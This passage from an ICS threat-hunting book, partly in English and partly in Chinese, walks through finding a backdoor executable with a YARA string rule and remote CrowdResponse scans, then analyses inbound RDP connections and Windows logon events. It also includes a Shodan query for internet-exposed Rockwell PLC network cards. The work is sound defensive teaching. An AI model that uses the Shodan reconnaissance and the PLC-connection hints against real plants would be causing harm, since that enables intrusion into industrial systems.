  \ artifact to add to our list:\n\n**Artifact 8 – Workstation12:** `C:\\Windows\\\
  System32\\backdoor.exe`\n\nThis concludes the search for artifacts around potential\
  \ malicious executables in our environment. I hope you see how powerful this technique\
  \ is. In a few steps, we go out, collect all startup processes in our environment,\
  \ filter out the potentially malicious one, verify this with VirusTotal lookups,\
  \ and pinpoint any potentially malicious content.\n\nNext, we are going to use found\
  \ artifacts and prove or disprove whether they indicate maliciousness.\n\n## Investigation\
  \ and forensics of suspicious endpoints\n\nIt is time to start answering the question\
  \ of whether there is malicious executable code running in our environment. For\
  \ this, we will take a closer look at the interesting artifacts we found throughout\
  \ this exercise. This is the list of artifacts we have found so far:\n\n- **Artifact\
  \ 1 – Workstation12:** `c:\\windows\\system32\\wbem\\unsecapp.exe`\n- **Artifact\
  \ 2 – Workstation12:** `c:\\windows\\system32\\dllhost.exe`\n- **Artifact 3 – Workstation12:**\
  \ `c:\\windows\\system32\\backdoor.exe`\n- **Artifact 4 – Workstation12:** `nat-service\
  \ c:\\windows\\system32\\backdoor.exe`\n- **Artifact 5 – Workstation12:** `fun-service\
  \ c:\\windows\\system32\\backdoor-v2.exe`\n- **Artifact 6 – FT-DIR1:** `C:\\PROGRA~2\\\
  ROCKWE~1\\RSLinx\\RSLINX.EXE`\n- **Artifact 7 – Workstation1:** `C:\\Users\\engineer-1\\\
  AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe`\n- **Artifact 8 – Workstation12:**\
  \ `C:\\Windows\\System32\\backdoor.exe`\n\nArmed with this list of suspicious locations,\
  \ we will take our hunt to the suspect systems.\n\n## Using discovered indicators\
  \ of compromise to search the environment for additional suspect systems\n\nNow\
  \ that we have narrowed down our list of suspicious artifacts to a single verified\
  \ malicious executable, backdoor.exe, as was found on Workstation12, let’s see whether\
  \ we have this executable running or present on other systems.\n\nIf we were to\
  \ just search for the backdoor.exe filename on all the hard drives in the environment,\
  \ we would miss copies of the malware that have a different name. What we want to\
  \ do is look for something that makes the executable stand out from the crowd, such\
  \ as a specific string or sequence of bytes that is unique to that executable, and\
  \ ideally is difficult to change. This is how, fundamentally, antivirus scanners\
  \ work. They have a large database of unique strings/byte sequences, called **patterns**.\
  \ If a specific pattern is found within a file, this would be an indicator that\
  \ the file is the malware that the pattern was extracted from.\n\nShort of writing\
  \ our own virus scanner pattern rules, we can use a tool that was designed to run\
  \ a similar search on hard drives, called YARA. We will discuss YARA next.\n\n##\
  \ Using YARA to find malicious executables\n\n**YARA** is a tool that can be used\
  \ to identify files that meet certain conditions and contain certain patterns. YARA\
  \ is a tool aimed at (but not limited to) malware researchers trying to identify\
  \ and classify malware samples. YARA allows you to detect malware (or whatever file\
  \ you are looking for) with the help of textual or binary patterns (descriptions).\
  \ Each description, or rule, consists of a set of strings and a Boolean expression\
  \ that determine its logic. You can define the definition in so-called YARA rule\
  \ files. More information on **YARA**, as well as a download link, can be found\
  \ here: https://virustotal.github.io/yara/.\n\nLet’s see the tool in action. We\
  \ will be creating a YARA rule file, test.rule, and entering a test rule to illustrate\
  \ how YARA finds patterns.\n\nCreate a file called test.rule and enter the following\
  \ content:\n\n```text\nrule ExampleRule\n{\n\tstrings:\n\t\t$my_ascii_string = \"\
  secret_to_find\"\n\t\t// The 'wide' keyword indicates the string is unicode\n\t\t\
  $my_unicode_string = \"secret to find\" wide\n\n\t\t// looking for hex value with\
  \ wildcards\n\t\t$my_hex_string = { FF FE 73 00 65 00 63 00 }\n\n\tcondition:\n\t\
  \t$my_ascii_string or $my_unicode_string or $my_hex_string\n}\n```\n\nThe rule defines\
  \ three types of patterns: an ASCII string, a Unicode string, and a hex string.\
  \ Then, the condition statement tells YARA that if any one of those three patterns\
  \ is found, it should report a positive hit for the file it is scanning.\n\nLet's\
  \ see this rule in action:\n\n```\npac@KVM0010110 : ~/workdir/yara-rules :\n> yara\
  \ -s -r .\\test.rule ..\\temp\\\nExampleRule ..\\temp\\mine\n0x2:$my_unicode_string:\
  \ s\\x00e\\x00c\\x00r\\x00e\\x00t\\x00 \\x00t\\x00o\\x00 \\x00f\\x00i\\x00n\\x00d\\\
  x00\n0x0:$my_hex_string: FF FE 73 00 65 00 63 00\n```\n\nYARA is called with the\
  \ following flags:\n\n- -s: To print the strings found\n- -r: Scan recursively\n\
  \nIf we are looking at the ..\\temp\\mine file in hexadecimal format via the hexdump\
  \ utility, we can see the pattern YARA reported on:\n\n```\npac@KVM0010110 : ~/workdir/yara-rules\
  \ :\n> HexDump ..\\temp\\mine\n00: FF FE 73 00 65 00 63 00 - 72 00 65 00 74 00 20\
  \ 00 | s e c r e t\n10: 74 00 6F 00 20 00 66 00 - 69 00 6E 00 64 00 | t o f i n\
  \ d |\n```\n\nThat covers our quick introduction to YARA. Let's see it in action\
  \ to uncover copies of backdoor.exe in our environment.\n\n## Using file strings\
  \ as an indicator of compromise\n\nIn order for this to work, we must find a unique\
  \ pattern to look for. Let's see whether there are specific strings present in the\
  \ executable file that we can use:\n\n```\npac@KVM0010110 : ~/workdir\\\n> strings\
  \ backdoor.exe\n\n!This program cannot be run in DOS mode.\nRich}E\n.text\n'.rdata\n\
  @.atbu\nPAYLOAD:\nExitProcess\nVirtualAlloc\nKERNEL32.dll\nAQAPRQVH1\nJJM1\nRAQH\n\
  AXAX^YZAXAYAZH\nXAYZH\nws2_32\n09ATI\nYPPM1\nunMa\nj@AYh\nKERNEL32.dll\nVirtualAlloc\n\
  ExitProcess\n```\n\nThat is a short list of strings for this executable. I suspect\
  \ the file is packed somehow. We should stay clear of using strings such as VirtualAlloc\
  \ or ExitProcess for your YARA rule as those will probably trigger hits on a bunch\
  \ of executables. We will use the j@AYh string for the occasion. It should be unique\
  \ enough for the job.\n\nCreating a YARA rule out of the string is very straightforward.\
  \ Just add it as a string definition and set a condition to find that string as\
  \ is shown here:\n\n```yara\nrule backdoorExecutable\n{\n    strings:\n        $string\
  \ = \"j@AYh\"\n    condition:\n        $string\n}\n```\n\nSave the file as `backdoor.yar`.\
  \ We can now use the custom rule to find copies of `backdoor.exe`:\n\n```\nyara\
  \ -s -r c:\\ c:\\workdir\\backdoor.yar\n```\n\nWe run the YARA rule on the `backdoor.exe`\
  \ file to test whether it works:\n\n```\npac@KVM0010110 : ~\\workdir\\\n> yara -s\
  \ -r backdoor.yar ./\nbackdoorExecutable ./backdoor.exe\n0x19a2:$string: j@AYh\n\
  ```\n\nAs a final check, when we run the YARA rule on a clean system, it shows that\
  \ the rule is unique enough not to discover false positives.\n\nWe are now ready\
  \ to start interrogating the environment to see whether we have any other systems\
  \ with the infection.\n\n## Remote scanning with `yara_scanner` using CrowdResponse\n\
  \nWe could use `psexec.exe` and copy over and run YARA and scan all domain computers\
  \ that way. That is a good option; however, in order to show another method and\
  \ because reporting capabilities are non-existent in YARA, we will look at using\
  \ CrowdStrike's **CrowdResponse** instead ([https://www.crowdstrike.com/resources/community-tools/crowdresponse/](https://www.crowdstrike.com/resources/community-tools/crowdresponse/)).\n\
  \n\n\n\n根据 CrowdStrike 网站的定义，该工具如下所示：\n\n> CrowdResponse 是一款模块化的 Windows 控制台应用程序，旨在协助收集主机信息以用于事件响应任务。该工具最初是为了支持我们的\
  \ CrowdStrike 服务团队在其事件响应任务期间的工作而编写的。当我意识到它在协助更广泛的安全社区收集数据以进行详细的后处理和分析方面潜力巨大后，我决定公开发布该工具的精简版。\n\
  \nCrowdResponse 通过模块实现了多种功能，非常值得一试。在本练习中，我们将只使用 YARA 功能。我们将通过使用 `psexec.exe` 的 Python\
  \ 脚本在所有域计算机上运行 CrowdResponse，收集数据，并生成一份非常方便的报告，详细说明任何发现。\n\n那么，让我们开始吧。按照以下说明安装并运行\
  \ `yara_scanner` Python 脚本：\n\n- 1. 我们将从 OT-DOMAIN 的域控制器 OT-DC1 上运行该脚本。请在该服务器上安装\
  \ Python 3。\n- 2. 相关 Python 工具可以从 `https://github.com/tsale/yara_scanner` 下载并解压到一个临时目录（workdir）。\n\
  - 3. 从 `https://docs.microsoft.com/en-us/sysinternals/downloads/psexec` 下载 `psexec.exe`，并将其解压到与\
  \ `yara_scanner` 脚本相同的目录中。\n- 4. 创建 `c:\\CrowdResponse` 文件夹，从 `https://www.crowdstrike.com/resources/community-tools/crowdresponse/`\
  \ 下载 CrowdResponse 文件，并将它们解压到 `c:\\CrowdResponse` 文件夹中。\n- 5. 创建 `c:\\CrowdResponse\\\
  results` 子文件夹。\n- 6. 我们需要对 `yara_scanner.py` 脚本做一些小修改。这些修改位于文件顶部，在输出中突出显示如下：\n\n\
  ```\nimport subprocess\nimport argparse\nimport time\n\ncrowdresponseEXE = \"C:\\\
  \\CrowdResponse\\\\CrowdResponse.exe\"\n# Specify the directory of the CrowdResponse\
  \ executable.\n```\n\n```\n**Make sure that you have rights to the folder.\ncrowdresponseDIR\
  \ = \"C:\\\\CrowdResponse\"\ntargets = []\n...\nprint(\"[+] Running CrowdResponse\
  \ on remote hosts\\n\")\nfor x in targets:\n    task = subprocess.run(f\"\"\"psexec.exe\
  \ \\\\\\\\{x} -d cmd /c \"c:\\\\temp\\\\crowdresponse.exe @Yara -t {directory} -v\
  \ -h -s -y C:\\\\Temp\\\\ > C:\\\\temp\\\\{x}_yara.xml\"\"\",capture_output=True).stdout.decode('utf-8')\
  \    # Run psexec command and output results on xml file.\n...\n```\n\n7. 创建一个文本文件，其中包含我们希望\
  \ `yara_scanner` 脚本作为目标的所有计算机 IP 地址，命名为 workdir\\targets.txt：\n\n```\n172.25.100.212\n\
  172.25.100.100\n172.25.100.201\n172.25.100.210\n172.25.100.220\n172.25.100.203\n\
  172.25.100.105\n172.25.100.110\n172.25.100.202\n```\n\n8. 现在我们可以运行扫描了：\n\n```\n\
  pac@KVM0010110 : ~/workdir/\npython.exe ./yara_scanner.py -f ./targets.txt -d c:\\\
  \ -m 1 -y C:\\workdir\\yara-rules\\\n```\n\n运行 `yara_scanner` 脚本所使用的参数如下：\n\n- -f：指定包含目标主机/IP\
  \ 的文件\n- -m：指定拉取频率（以分钟为单位。默认 = 5 分钟）\n- -d：指定远程主机上要扫描的目录（需要指定完整路径）\n- -y：指定要用于远程主机的\
  \ YARA 规则（位于本地主机上）的目录（需要指定完整路径）\n\n运行该 Python 脚本会将 **CrowdResponse** 工具部署到 `targets.txt`\
  \ 中的所有计算机，并发送命令来运行扫描。然后它会设置一个计时器，并回访这些计算机以检查扫描是否完成。在扫描运行期间，我们会收到以下反馈：\n\n```\nC:\\\
  workdir> python.exe \\.\\yara_scanner.py -f .\\targets.txt -d\nC:\\ -m 1 -y C:\\\
  workdir\\yara-rules\\\n[*] Checking if all targets are alive\n    - Removing 172.25.100.220\
  \ as it appears offline\n    - Removing 172.25.100.203 as it appears offline\n[+]\
  \ Copying CrowdResponse on the remote hosts\n[+] Running CrowdResponse on remote\
  \ hosts\n\n    - 172.25.100.212 is still running\n    - 172.25.100.100 is still\
  \ running\n    - 172.25.100.201 is still running\n    - 172.25.100.210 is still\
  \ running\n    - 172.25.100.105 is still running\n    - 172.25.100.110 is still\
  \ running\n    - 172.25.100.202 is still running\n1 minute(s) passed\n\n    - 172.25.100.212\
  \ is still running\n    - 172.25.100.100 is still running\n    - 172.25.100.201\
  \ is still running\n    - 172.25.100.210 is still running\n    - 172.25.100.105\
  \ is still running\n    - 172.25.100.110 is still running\n    - 172.25.100.202\
  \ is still running\n2 minute(s) passed\n...\n    - 172.25.100.201 is still running\n\
  15 minute(s) passed\n```\n\n```\n> + Remote host 172.25.100.201 is done!\n> All\
  \ done!\n> PS C:\\yara_scanner-master>\n```\n\n现在扫描已完成，我们可以通过打开 C:\\CrowdResponse\\\
  results\\CrowdResponse_yara.html 文件来查看结果：\n\n## 由免费的 [CrowdStrike](link) 工具 CrowdResponse\
  \ 生成\n\n**模块：yara**\n\n| 系统 | YARA 文件 | PID 文件 | 标识符 | 结果 |\n| :------- | :-----------------------\
  \ | :------------------------------- | :--------------------- | :------ |\n| 172.25.100.210_yara\
  \ | C:\\Temp\\backdoor.yar | c:\\windows\\winsservice.exe | backdoorExecutable |\
  \ TRUE |\n| 172.25.100.212_yara | C:\\Temp\\backdoor.yar | c:\\windows\\System32\\\
  backdoor.exe | backdoorExecutable | TRUE |\n| 172.25.100.212_yara | C:\\Temp\\backdoor.yar\
  \ | c:\\windows\\Temp\\backdoor.exe | backdoorExecutable | TRUE |\n\n图 12.15 – CrowdResponse\
  \ 报告\n\n正如你所看到的，扫描在 172.25.100.210（Workstation10）上发现了 backdoor.exe 文件的另一个副本！\n\n\
  这就完成了我们对恶意或不需要的应用程序的威胁搜寻。\n\n### 总结\n\n在本章中，我们经历了证明或反驳“工业环境中的资产上运行着恶意或不需要的应用程序”这一假设的过程。我们看到了如何通过组合数据、工具、技术和活动，不仅成功地证明了我们的假设，还发现了环境中被入侵的系统。我们甚至发现了占用资源和带宽的软件（uTorrent）。本章涵盖三个假设中的第二个，这些假设在成功执行后，能够形成一种有效的策略，帮助清理或验证工业网络中新的或长期被忽视部分的环境。\n\
  \n在下一章中，我们将围绕第三个假设“有可疑的外部连接进入工业环境”执行威胁搜寻活动。\n"
- "## 13\n威胁搜寻\n场景 3 –\n可疑的外部\n连接\n\n在本章中，我们将执行三个威胁搜寻场景系列中的第三个，也是最后一个威胁搜寻练习；正如我们在第\
  \ 10 章“威胁搜寻”中讨论的那样，这些场景有助于评估新的或额外的工业控制系统（ICS）网络（分段）的网络安全卫生状况。通过定义以下三个威胁搜寻假设——“有恶意行为者（试图）向外部\
  \ IP/域发送信标”、“工业环境中的资产上运行着恶意或不需要的应用程序”以及“有可疑的外部连接进入工业环境”——并围绕这些假设执行威胁搜寻练习，我们试图在采用或整合一个新的\
  \ ICS 网络，或对现有 ICS 网络进行添加/扩展时，尽可能多地发现恶意活动。其理念是，通过对一个未知的 ICS 网络预先执行这三个威胁搜寻练习，我们就可以在将新网络（分段）连接到现有基础设施之前，合理地确信我们会发现任何不受欢迎的访客。\n\
  \n# 形成“可疑的外部连接”威胁搜寻假设\n\n正如我们在*第 10 章“威胁搜寻”*中讨论的那样，威胁搜寻练习是围绕假设展开的。通常，假设源于或反映了已发现的安全事件、自动安全监控系统发出的某种警报，或安全分析师得出的某个发现。我们将在本章中执行的威胁搜寻练习略有不同。我们将要执行威胁搜寻活动的环境对我们来说并不熟悉，或是新接触的环境。我们公司收购了一个新的生产工厂，该工厂拥有现有的\
  \ ICS 网络基础设施，他们希望将其与现有的公司基础设施连接起来，而我们需要确保这样做是安全的。另一种情况是，你的 ICS 网络已经运行了很长时间，但你从未认真审视过其安全态势。在这种情况下，这些“非触发式”威胁搜寻练习可以快速、准确地让你了解\
  \ ICS 环境中的恶意活动或内容。\n\n在*第 11 章“威胁搜寻场景 1 – 恶意软件信标”*中，我们研究了离开 ICS 环境的可疑网络连接（出站连接）。我们讨论过，由于工业系统（预期）的隔离特性，来自工业网络的出站连接应该很少见。这一点同样适用于入站连接（进入\
  \ ICS 网络的合法连接）。来自企业网络的连接应保持在最低限度，并加以明确定义（受到控制和监控），而来自互联网的连接则应完全阻止。\n\n总的来说，检查进出\
  \ ICS 环境的连接是发现恶意活动的绝佳方式。正如我们在*第 11 章“威胁搜寻场景 1 – 恶意软件信标”*中搜寻信标时所看到的，检查流量模式揭示了受感染的工作站正在连接其**命令与控制（C&C\
  \ 或 C2）**服务器。\n\n我们将应用类似的技术来发现可疑的入站连接。利用“从外部网络进入工业网络的连接不应该很多”这一便利事实，我们将通过搜索一些常见的指标（这些指标可以将恶意连接与合法连接区分开来），看看能否证明或反驳**“有可疑的外部连接进入工业环境”**这一假设。\n\
  \n让我们从讨论（入站）连接开始。\n\n\n\n\n现在我得承认，在我的职业生涯中见过一些灾难性的配置，但要使前面描述的场景可行，IT安全管理员必定错误配置了企业DMZ（IT-DMZ），允许通过企业DMZ防火墙的访问（或者DMZ中的代理服务已被攻击者入侵）。此外，企业到工业防火墙（ENT-IND防火墙）必须配置错误，允许从互联网访问工业区（就像防火墙中忘记删除的允许所有规则一样简单）。虽然所描述的场景是可能的，但鉴于近年来ICS所有者表现出的安全意识增强，这种情况极不可能发生。\n\
  \n我仍然鼓励威胁猎手将对从互联网发起到ICS环境的连接进行搜索纳入工作，原因在于近年来有一种趋势，将ICS系统与云服务绑定，以实现回连功能或云产品中的数据分析。如果这些技术没有正确实施（这种情况经常发生），最终可能导致ICS网络直接连接到互联网。为了说明这一点，请考虑下图中显示的示例设置：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_569_0.png)\n\n图13.4 – 影子互联网连接 – 通往ICS网络的后门\n\
  \n在此示例场景中，供应商安装了一个蜂窝路由器，例如Moxa提供的产品（https://www.moxa.com/en/products/industrial-network-infrastructure/cellular-gateways-routers/cellular-gateways/oncells-g3150a-lte-series），以允许现场运行的应用程序连接到供应商拥有的云服务（或更糟的是，让云服务连接到工业网络设备），目的是发送其设备的性能数据和/或允许某种类型的连接以进行故障排除或其他支持。该设置没有正确限制来自互联网的访问，或者所使用的蜂窝设备存在漏洞，现在允许攻击者进入组织的工业网络，从而允许从互联网直接访问供应商解决方案可访问的任何内容。\n\
  \n觉得这太离谱？看看下面在https://www.shodan.io/上的搜索，搜索词为enbt OR en2t，以发现暴露在互联网上的罗克韦尔自动化PLC网络卡：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_570_0.png)\n\n图13.5 – 使用Shodan搜索罗克韦尔网络接口卡\n\
  \n如果这些IP地址中有任何一个属于你，请将此视为一次免费的警醒。\n\n这里返回的每个结果都是与组织内部（ICS）网络的直接连接。要开始与罗克韦尔设备通信，我们只需将Factory\
  \ Talk编程套件或Python模块Pylogix（我们在第7章“主动安全监控”中讨论过，https://github.com/dmroeder/pylogix）指向搜索结果并连接即可。现在，仔细看看结果页面。注意到左侧统计信息中的规律了吗？\n\
  \n## 顶级组织\n\n|  |  |\n|---|---|\n| Verizon Wireless | 101 |\n| TE Data | 19 |\n\
  | AT&T Wireless | 14 |\n| Bell Canada | 14 |\n| Krakr1901 | 10 |\n\n图13.6 – 顶级组织均为蜂窝运营商\n\
  \n被发现的IP地址所属的大多数组织都是蜂窝服务提供商！使这个问题更加复杂的是，这些IP地址不会出现在任何人的文档中。拥有此类蜂窝连接的组织通常不知道自己的IP地址，因此，如果执行互联网暴露检查（我强烈建议至少每年一次，https://threatgen.com/checking-the-internet-exposure-of-your-ics-using-shodan-io/），这类设备不会被检查，因为它们未登记为属于该组织。\n\
  \n你可能还记得我在第3章“工业非军事区”中曾详细谈论过这种情况。我想再次强调此类宽松配置的潜在影响。它们确实是攻击者会首先寻找的低垂果实。如果你的设备出现在Shodan.io上，你就应该认为自己已被入侵！一般来说，你应该防止供应商在你的工业网络上安装此类影子互联网连接，而应使用IDMZ中的专用服务，如第3章“工业非军事区”所述。\n\
  \n那么，除了运气好找到一个暴露在互联网上的目标之外，考虑到如今通过常规互联网连接直接访问组织/工厂已不可行，攻击者如何从互联网破坏工业环境？我们将在接下来看到这个问题的答案。\n\
  \n## 源自企业网络的攻击\n\n任何配置还算得当的企业与工业区之间的防火墙，都会阻止来自互联网的IP地址穿越到工业网络。如果安装并正确配置了IDMZ，此类连接肯定会被阻止。随着从互联网到工业网络的直接连接越来越难找到，攻击者已经调整了技术，会先设法在企业网络上建立立足点，然后尝试通过横向移动进入工业网络。这个最初的立足点可能是钓鱼电子邮件的结果，该邮件让接收者打开恶意Office文档，或诱骗他们访问恶意网站。这两条路径都会导致恶意软件被安装到企业用户的计算机上。初始访问也可能来自意外感染，即企业用户仅访问了一个恶意网站（路过式下载）而被恶意软件感染。诸如此类的意外失陷经常在暗网上出售，使得有特定攻击目标的对手只需购买即可进入企业网络。\n\
  \n当然，还有更多场景，但重点是攻击者已在组织企业侧的系统上获得了初始立足点。现在，要么攻击者找到进入工业网络的方法，要么在这个过程中被抓住，只是时间问题，而后者通常需要平均200天或更长时间。\n\
  \n下图描述了以破坏工业网络（上的资产）为目标的攻击者的攻击路径：\n\n## 入站网络连接\n\n![](img/c8ffa9959721097701584fcc95101362_573_0.png)\n\
  \n图13.7 – 以工业网络为目标的横向移动攻击\n\n如图所示，攻击者将利用其在企业网络系统内的立足点，横向移动进入工业环境，并攻击工业网络上的资产。攻击者的“最终”目标在进入工业网络后的一段时间才会实现。例如，最终目标可能是攻击者利用受感染的Level\
  \ 3现场运营服务器（如前面示意图中所示的Pi Historian）或其他方便的途径来窃取有价值的数据，或为攻击PLC或其他Level 2（及以下）设备铺平道路。\n\
  \n我刚才解释的正是**ICS网络杀伤链**。ICS网络杀伤链源自*IT网络杀伤链*（由洛克希德·马丁公司提出 – https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html），并根据大多数现代ICS环境的层次化/分区化/分段化特性进行了调整。ICS网络杀伤链由SANS研究所开发并记录在案，你可以在此阅读更多信息：https://www.sans.org/reading-room/whitepapers/ICS/industrial-control-system-cyber-kill-chain-36297。\n\
  \n我们将在*第17章“ICS环境渗透测试”*中更详细地讨论ICS网络杀伤链。\n\n接下来，让我们探讨如何检测横向移动攻击。我们将从查看源自企业区并进入工业网络的连接开始。\n\
  \n## 源自企业区的入站网络连接\n\n现在，我们将查看Zeek为我们记录的网络连接，其中源IP地址位于企业网络子网内，这是组织中通常已知的IP地址范围（在我们的实验室设置中为10.0.0.0/24）。\n\
  \n\n\n导航至 **Home | Network | Connections**。在搜索栏中添加以下搜索字符串：`AND source.ip: 10.0.0.0/24`（这将过滤掉除企业网络子网作为源\
  \ IP 地址以外的所有流量）。接下来，对 `connection.local.responder is true` 设置过滤器（这将过滤掉除由本地子网（即工业网络子网）上的系统响应的连接以外的所有连接）。最后，将仪表板的时间范围设置为\
  \ **最近 7 天**（请记住，在我们用于执行三次威胁狩猎演练的*新或附加网络*场景中，我们仅在过去的 7 天内监控安全状况）：\n\n![](img/c8ffa9959721097701584fcc95101362_575_0.png)\n\
  \n图 13.8 – 源自企业系统的连接\n\n此次搜索找到了 173 个连接，全部来自 IP 地址为 `10.0.0.200` 的企业系统，目标是 IP 地址为\
  \ `172.25.100.201`（Workstation1）的工业系统，通过端口 3389。端口 3389 通常用于 **远程桌面协议 (RDP)** 连接。\n\
  \n我们可以从此次发现中识别出以下有趣的入站连接细节：\n\n- `10.0.0.200 − 3389 − 172.25.100.201`\n\n接下来，我们将调查是否能找到围绕此连接的恶意活动。\n\
  \n### 查看来自工业端点的交互\n\n远程桌面协议连接通常被用作企业用户与工业环境交互的合法手段。事实上，正如我们在第 3 章“工业非军事区”中所讨论的，这是防止人类交互直接影响（触碰）工业设备的首选方式。因此，发现这类连接本身并不一定是恶意的。我们需要查看在连接建立期间发生了什么，换句话说，企业用户从工业端点与\
  \ ICS 网络上的其他系统和设备进行了哪些交互？为此，我们将使用我们在第 9 章“可视化、关联和警报”中构建的违规检测仪表板。请按照以下步骤深入了解情况：\n\
  \n1. 作为第一步，我们需要确定要应用于违规检测仪表板的时间范围。为此，我们将查看网络连接仪表板中的事件详情（所有日志）部分：\n\n![](img/c8ffa9959721097701584fcc95101362_576_0.png)\n\
  \n图 13.9 – 所有连接日志，从企业到工业\n\n此面板向我们显示，最近记录的 RDP 连接（在我们指定的时间范围内）发生在 2021 年 1 月 21\
  \ 日 @ 13:09:21.674。这是我们的结束时间。\n\n2. 现在点击时间戳列（`Time`）标题名称旁边的向下箭头。这会反转事件的列出的顺序，我们会看到在我们设置的时间范围内\
  \ RDP 连接的第一次出现：\n\n| Time | source.ip | source.port | destination.ip | destination.port\
  \ |\n| :--- | :--- | :--- | :--- | :--- |\n| > 2021 年 1 月 18 日 @ 09:16:57.299 |\
  \ 10.0.0.200 | 49837 | 172.25.100.201 | 3389 |\n| > 2021 年 1 月 18 日 @ 09:17:14.212\
  \ | 10.0.0.200 | 49842 | 172.25.100.201 | 3389 |\n\n图 13.10 – 查找第一次出现\n\n我们现在有了用于违规检测仪表板的开始时间戳：`2021\
  \ 年 1 月 18 日 @ 09:16:57.299`。这里我们需要考虑一个细节，Zeek 在连接结束时记录连接，因此我们需要查看连接持续时间并从中减去该持续时间。如果我们打开第一个事件的详细信息，连接持续时间列在\
  \ `event.duration` 中，并以秒为单位显示。对于开始事件，它是 `16.893`，在这种情况下可以忽略不计，但如果数值较大则可能会产生重大影响，因此请确保在威胁狩猎活动期间考虑到这一点。\n\
  \n3. 取得开始和结束时间戳后，我们现在可以设置违规检测仪表板的时间范围，为了方便输入，我们将定义从 `2021 年 1 月 18 日 @ 09:00` 到\
  \ `2021 年 1 月 21 日 @ 13:30`：\n\n![](img/c8ffa9959721097701584fcc95101362_577_0.png)\n\
  \n图 13.11 – 设置开始和停止时间戳\n\n![](img/c8ffa9959721097701584fcc95101362_579_0.png)\n\n\
  - **可疑入站连接** 显示了在我们指定的时间范围内记录的入站连接的摘要视图：\n\n![](img/c8ffa9959721097701584fcc95101362_579_1.png)\n\
  \n所有这些标识符都提供了警报警惕的正当理由，并应进行调查，但最令人担忧的标识符是在此时间段内记录的 Forescout **Silentdefense 警报**：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_579_2.png)\n\n有明确迹象表明 Rockwell Automation\
  \ PLC (ETHIP) 正在接收固件更新！这种情况并不经常发生，尤其是在工作时间内。这是我们将要处理的警报。\n\n### 最终是谁执行了 PLC 固件更新？\n\
  \n已知固件更新是从 Workstation1 (172.25.100.201) 执行的，而该工作站被企业网络中的一个客户端 (10.0.0.200) 访问，我们需要弄清楚企业侧的该系统中谁已登录。为此，我们需要一个目标时间范围来搜索\
  \ 10.0.0.200 机器事件日志中的登录事件。\n\n为了获取此信息，我们将查看 SilentDefense 记录固件更新警报的事件时间戳。当鼠标悬停在警报文本上时，点击“Filter\
  \ for value”弹出命令按钮来过滤该事件。向下滚动违规检测仪表板以查看事件详情：\n\n![](img/c8ffa9959721097701584fcc95101362_580_0.png)\n\
  \n图 13.17 – 违规检测仪表板 – 固件警报详情\n\n我们有了目标时间戳：2021 年 1 月 21 日 @ 13:12:06.909。让我们切换到\
  \ 10.0.0.200 机器看看能找到什么。\n\n### 探索企业系统的事件日志\n\n不幸的是，企业计算机 10.0.0.200 未配置为将其事件发送到集中日志记录设施，或者我们没有访问权限。我们将不得不以传统方式这样做：\n\
  \n1. 一旦我们登录到 10.0.0.200，我们打开 **Windows 事件查看器（开始菜单 | Windows 管理工具 | 事件查看器）** 并导航到\
  \ **Security**（安全）日志部分：\n\n![](img/c8ffa9959721097701584fcc95101362_581_0.png)\n\
  \n图 13.18 – 可疑企业系统 – 安全事件日志\n\n我们将定义一个过滤器，以显示我们之前发现的警报时间戳附近的登录事件。点击事件查看器屏幕右侧的 **Filter\
  \ Current Log**（过滤当前日志）按钮，并输入以下条件：\n\n![](img/c8ffa9959721097701584fcc95101362_582_0.png)\n\
  \n图 13.19 – 可疑企业系统 – 围绕 SilentDefense 警报时间戳过滤事件日志\n\n我们定义的过滤器通过（通过 Logged 部分）缩小了显示的事件时间范围，并过滤事件\
  \ ID `4624`，这是 Windows 系统在账户成功登录系统时记录的事件（https://www.ultimatewindowsssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624）。\n\
  \n点击 **OK** 以应用过滤器。\n\n3. 现在我们只剩下大量的登录事件列表，其中大部分对于在 Windows 机器上运行的服务或来自域控制器等其他系统的交互来说是合法的。你可以浏览此列表看看是否发现有趣的内容。这可能花点时间，但如果你知道要找什么（寻找非\
  \ *SYSTEM* 账户的登录是一个好的开始），这是可以完成的。还有另一种选择：我们可以搜索具有特定登录类型的事件。外部实体登录 Windows 机器有多种方式。以下是所有这些类型的表格：\n\
  \n| Logon type | Description |\n| :--- | :--- |\n| 2 | *Interactive*（使用系统键盘和屏幕进行登录）\
  \ |\n| 3 | Network（例如，连接到共享文件夹） |\n| 4 | Batch（例如，计划任务） |\n| 5 | *Service*（服务启动）\
  \ |\n| 7 | Unlock（例如，带有密码保护屏幕保护程序的无人值守工作站） |\n| 8 | *NetworkCleartext*（使用明文发送凭据进行登录）\
  \ |\n| 9 | *NewCredentials* 例如使用 *RunAs* 或映射网络驱动器 |\n| 10 | *RemoteInteractive*（终端服务、远程桌面或远程协助）\
  \ |\n| 11 | *CachedInteractive*（使用缓存的域凭据登录，例如在离开网络时登录笔记本电脑） |\n\n我们感兴趣的登录类型是 **2\
  \ — Interactive**（交互式）、**7 — Unlock**（解锁）和 **10 — RemoteInteractive**（远程交互式）。这允许我们搜索\
  \ **在本地登录** 到计算机的人（**类型 2**）或 **通过远程桌面会话** 登录的人（**类型 10**），此外，它还显示用户 **重新登录** 且需要\
  \ **解锁** 计算机的连接（**类型 7**）。\n\n解释完这些后，让我们搜索这三种登录类型：\n\n1. 打开 **Filter Current Log**\
  \ 屏幕并切换到 **XML** 选项卡。\n2. 选中 **Edit query manually**（手动编辑查询）复选框。\n3. 用以下内容替换 XML\
  \ 查询文本（你的 TimeCreated 条目需要根据你的时间范围进行调整）：\n\n```\n<QueryList>\n\t<Query  Id='0' Path='Security'>\n\
  ```\n\n\n\n\n```xml\n<Select Path='Security'>*[System[(EventID=4624)\nand\nTimeCreated\n\
  [@SystemTime&gt;='2021-01-21T19:30:00.000Z'\nand\n@SystemTime&lt;='2021-01-21T21:00:00.999Z']]\n\
  and\n*[EventData[Data[@Name='LogonType']\nand (Data=2 or Data=7 or Data=10)]]\n\
  </Select>\n</Query>\n</QueryList>\n```\n\n4. 这将显著减少事件数量。查找异常会更容易管理：\n\n   ![](img/c8ffa9959721097701584fcc95101362_584_0.png)\n\
  \n   图13.20 – 可疑企业系统 – 搜索指定登录类型的事件日志\n\n5. 浏览剩余事件，看看是否能找到任何突出之处。\n\n6. 此外，如果查询仍然返回过多事件，你可以从较少的登录类型开始。排除类型2后，除了2个事件外，其他所有事件都被消除：\n\
